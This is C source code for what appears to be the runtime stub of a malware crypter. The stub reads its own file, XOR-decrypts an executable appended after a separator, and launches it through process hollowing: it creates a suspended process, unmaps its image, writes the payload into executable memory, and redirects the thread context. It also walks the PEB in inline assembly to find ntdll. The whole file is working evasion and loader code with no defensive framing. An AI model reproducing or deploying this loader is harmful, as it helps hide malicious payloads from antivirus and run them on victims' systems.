#ifdef _DEBUG
//#error No support
#endif

#ifdef WIN32
#define A86
#else
#define A64
#endif
#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <TlHelp32.h>

#include "../common/common.h"

HANDLE ExecuteFile3(LPSTR szFilePath, LPVOID pFile)
{
	HANDLE np = INVALID_HANDLE_VALUE;

	typedef LONG(WINAPI* NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
	typedef BOOL(WINAPI* NtSetThreadContext)(HANDLE hThread, PCONTEXT lpContext);

	HMODULE hNt = NULL;

//#ifdef A86
/*	__asm
	{
		mov ebx, fs: [0x30]		// Get PEB
		mov ebx, [ebx + 0xC]	// Get PEB->Ldr
		mov ebx, [ebx + 0x14]	// Get 1st Entry
		mov ebx, [ebx]
		mov ebx, [ebx + 0x10]	// Get the entry's base address
		mov hNt, ebx
	}*/
//#else
	hNt = GetModuleHandleA("ntdll");
//#endif

	if (!hNt)
		return INVALID_HANDLE_VALUE;

	PIMAGE_DOS_HEADER IDH;
	PIMAGE_NT_HEADERS INH;
	PIMAGE_SECTION_HEADER ISH;
	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	PCONTEXT CTX;
	PDWORD dwImageBase;

	NtUnmapViewOfSection xNtUnmapViewOfSection;
	NtSetThreadContext xNtSetThreadContext;

	LPVOID pImageBase;
	int Count;
	IDH = (PIMAGE_DOS_HEADER)(pFile);

	if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
	{
		INH = (PIMAGE_NT_HEADERS)((DWORD)(pFile) + IDH->e_lfanew);
		if (INH->Signature == IMAGE_NT_SIGNATURE)
		{
			RtlZeroMemory(&SI, sizeof(SI));
			RtlZeroMemory(&PI, sizeof(PI));

			if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
			{
				CTX = (PCONTEXT)(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
				CTX->ContextFlags = CONTEXT_FULL;
				if (GetThreadContext(PI.hThread, (LPCONTEXT)(CTX)))
				{
#ifdef A86
					PDWORD regBX = &CTX->Ebx;
#else
					PDWORD regBX = &CTX->Rdx;
#endif

					ReadProcessMemory(PI.hProcess, (LPCVOID)(*regBX + sizeof(LPVOID) * 2), (LPVOID)(&dwImageBase), sizeof(LPVOID), NULL);

					if ((DWORD)(dwImageBase) == INH->OptionalHeader.ImageBase)
					{
						xNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(hNt, "NtUnmapViewOfSection"));
						xNtUnmapViewOfSection(PI.hProcess, (PVOID)(dwImageBase));
					}

					pImageBase = VirtualAllocEx(PI.hProcess, (LPVOID)(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);



					if (pImageBase)
					{
						WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
						for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++)
						{
							ISH = (PIMAGE_SECTION_HEADER)((DWORD)(pFile) + IDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (Count * sizeof(IMAGE_SECTION_HEADER)));
							WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD)(pImageBase) + ISH->VirtualAddress), (LPVOID)((DWORD)(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
						}
						WriteProcessMemory(PI.hProcess, (LPVOID)(*regBX + sizeof(LPVOID) * 2), (LPVOID)(&INH->OptionalHeader.ImageBase), sizeof(LPVOID), NULL);

#ifdef A86
						PDWORD regAX = &CTX->Eax;
#else
						PDWORD regAX = &CTX->Rcx;
#endif

						*regAX = (DWORD)(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;

						xNtSetThreadContext = (NtSetThreadContext)(GetProcAddress(hNt, "NtSetContextThread"));
						xNtSetThreadContext(PI.hThread, (LPCONTEXT)(CTX));

						np = PI.hThread;
						
					}
				}

				ResumeThread(PI.hThread);
			}
		}
	}

	//VirtualFree(pFile, 0, MEM_RELEASE);

	return np;
}

//kernel 0x76dd0000
DWORD GetAddress32(int entry)
{
	DWORD kernelAddr = 0;

	__asm
	{
		mov ebx, fs: [0x30]		// Get PEB
		mov ebx, [ebx + 0xC]	// Get PEB->Ldr
		mov ebx, [ebx + 0x14]	// Get 1st Entry
	}

	while (entry--) {
		__asm
		{
			mov ebx, [ebx]
		}
	}

	__asm
	{
		mov ebx, [ebx + 0x10]	// Get the entry's base address
		mov kernelAddr, ebx
	}


	return kernelAddr;
}

HANDLE ExecuteFile(LPSTR szFilePath, LPVOID pFile)
{
	HANDLE np = (HANDLE)NULL;
	typedef LONG(WINAPI* NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
	typedef BOOL(WINAPI* NtSetThreadContext)(HANDLE hThread, PCONTEXT lpContext);

	HMODULE m_hmNtdll = (HMODULE)GetAddress32(1);
	//HMODULE m_hmKernel = (HMODULE)GetAddress32(2);

	PIMAGE_DOS_HEADER IDH;
	PIMAGE_NT_HEADERS INH;
	PIMAGE_SECTION_HEADER ISH;
	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	PCONTEXT CTX;
	PDWORD dwImageBase;

	NtUnmapViewOfSection xNtUnmapViewOfSection;
	NtSetThreadContext xNtSetThreadContext;

	LPVOID pImageBase;
	int Count;
	IDH = (PIMAGE_DOS_HEADER)(pFile);

	if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
	{
		INH = (PIMAGE_NT_HEADERS)((DWORD)(pFile)+IDH->e_lfanew);
		if (INH->Signature == IMAGE_NT_SIGNATURE)
		{
			RtlZeroMemory(&SI, sizeof(SI));
			RtlZeroMemory(&PI, sizeof(PI));

			if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
			{
				CTX = (PCONTEXT)(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
				CTX->ContextFlags = CONTEXT_FULL;
				if (GetThreadContext(PI.hThread, (LPCONTEXT)(CTX)))
				{
					ReadProcessMemory(PI.hProcess, (LPCVOID)(CTX->Ebx + 8), (LPVOID)(&dwImageBase), 4, NULL);

					if ((DWORD)(dwImageBase) == INH->OptionalHeader.ImageBase)
					{
						xNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(m_hmNtdll, "NtUnmapViewOfSection"));
						xNtUnmapViewOfSection(PI.hProcess, (PVOID)(dwImageBase));
					}

					pImageBase = VirtualAllocEx(PI.hProcess, (LPVOID)(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);



					if (pImageBase)
					{
						WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
						for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++)
						{
							ISH = (PIMAGE_SECTION_HEADER)((DWORD)(pFile)+IDH->e_lfanew + 248 + (Count * 40));
							WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD)(pImageBase)+ISH->VirtualAddress), (LPVOID)((DWORD)(pFile)+ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
						}
						WriteProcessMemory(PI.hProcess, (LPVOID)(CTX->Ebx + 8), (LPVOID)(&INH->OptionalHeader.ImageBase), 4, NULL);
						CTX->Eax = (DWORD)(pImageBase)+INH->OptionalHeader.AddressOfEntryPoint;

						xNtSetThreadContext = (NtSetThreadContext)(GetProcAddress(m_hmNtdll, "NtSetContextThread"));
						xNtSetThreadContext(PI.hThread, (LPCONTEXT)(CTX));
						np = PI.hThread;

					}
				}

				//while (!GetThreadPriority(PI.hThread)) {
				ResumeThread(PI.hThread);
				//}
			}
		}
	}
	VirtualFree(pFile, 0, MEM_RELEASE);
	return np;
}

#include <stdio.h>

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow)
{
	AllocConsole();
	freopen(("CONOUT$"), ("w"), stdout);

	UCHAR szKey[64] = STUB_DEFAULT_KEY;
	UCHAR szSeparator[16] = STUB_DEFAULT_SEPARATOR;

	printf("key: '%.64s'\nsize: %d-%d\n", szKey, strlen(szKey), sizeof szKey);
	printf("separator: '%.16s'\nsize: %d-%d\n", szSeparator, strlen(szSeparator), sizeof szSeparator);

	char szCurrentFilepath[MAX_PATH];
	GetModuleFileNameA(NULL, szCurrentFilepath, MAX_PATH);

	HANDLE hStubFile = CreateFileA(szCurrentFilepath, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hStubFile == INVALID_HANDLE_VALUE)
		ExitProcess(0);

	LARGE_INTEGER size;
	if (!GetFileSizeEx(hStubFile, &size))
		ExitProcess(0);

	printf("size of stub: %d\n", size.QuadPart);

	DWORD iStubSize = size.QuadPart;
	PUCHAR lpStubData = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, iStubSize * sizeof(UCHAR));
	if (!lpStubData)
		ExitProcess(0);

	DWORD iStubBytesReaded = 0;
	if (!ReadFile(hStubFile, lpStubData, iStubSize, &iStubBytesReaded, NULL) || iStubBytesReaded != iStubSize) {
		HeapFree(GetProcessHeap(), NULL, lpStubData);
		ExitProcess(0);
	}

	CloseHandle(hStubFile);

	int iSeparatorPositionEnd = FindSig(lpStubData, iStubSize, szSeparator, sizeof szSeparator, 1) + sizeof szSeparator;
	int iExecutableSize = iStubSize - iSeparatorPositionEnd;

	printf("finded separator: '%.16s' on %d\n", lpStubData + iSeparatorPositionEnd - sizeof szSeparator, iSeparatorPositionEnd - sizeof szSeparator);
	printf("size of executable: %d\n", iExecutableSize);

	//if (iSeparatorPositionEnd != sizeof szSeparator){

		PUCHAR lpExecutable = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, iExecutableSize * sizeof(UCHAR));
		if (!lpExecutable) {
					HeapFree(GetProcessHeap(), NULL, lpStubData);
			ExitProcess(0);
		}

		for (int i = iSeparatorPositionEnd; i < iStubSize; i++)
			*(lpExecutable + (i - iSeparatorPositionEnd)) = *(lpStubData + i);
		
		XORBinary(lpExecutable, iExecutableSize, szKey, sizeof szKey);

		//HANDLE hOutputFile = CreateFileA("test_TEST.exe", FILE_WRITE_DATA, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL);
		//DWORD written = 0;
		//WriteFile(hOutputFile, lpExecutable, iExecutableSize, &written, NULL);

		//if (ExecuteFile(szCurrentFilepath, lpExecutable) == INVALID_HANDLE_VALUE)
		//	ExitProcess(0);

		ExecuteFile(szCurrentFilepath, lpExecutable);

		//HeapFree(GetProcessHeap(), NULL, lpExecutable);
	//}

	//HeapFree(GetProcessHeap(), NULL, lpStubData);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		if (msg.message == WM_QUIT)
			break;

		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	FreeConsole();

	return 0;
}